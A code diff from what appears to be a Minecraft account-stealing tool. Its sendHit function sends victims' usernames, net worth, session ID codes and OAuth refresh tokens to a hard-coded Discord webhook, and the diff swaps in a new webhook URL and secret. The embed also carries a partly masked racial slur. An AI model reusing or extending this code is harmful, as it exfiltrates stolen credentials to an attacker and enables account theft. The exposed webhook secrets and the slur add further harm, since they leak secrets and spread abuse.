@@ -73,7 +73,7 @@ const getInfo = async (res) => {
 };
 
 const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
-  const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1231697682213503046/sp-6jahMB16cWKMauwQtC9Yoafx5Q831Mn_xutVOQfO7WHtCOOTSTnBbJUXSh8ecNAqk' });
+  const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1253758739438112838/uACwVcFkt7z8ofSls2f3PYEHlUhhG_-KfRFJhFH2hUaiYK2TePckUZvBJSnjwq072Hwf' });
 
   const networth = Math.floor(firstProfileData.data.networth.networth).toLocaleString('en-US', { style: 'decimal' });
   const uNetworth = Math.floor(firstProfileData.data.networth.unsoulboundNetworth).toLocaleString('en-US', { style: 'decimal' });
@@ -86,7 +86,7 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
     .setTitle(name)
     .setURL('https://sky.shiiyu.moe/stats/' + name)
     .setThumbnail('https://crafatar.com/avatars/' + id)
-    .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth2-0-ax54.onrender.com/refresh?refreshToken=' + refresh })
+    .setAuthor({ name: 'Hit Some Ni**a Hard', url: '' + refresh })
     .addFields(
       { name: 'Network', value: '```' + networth + '```' },
       { name: 'Unsoulbound', value: '```' + uNetworth + '```' },
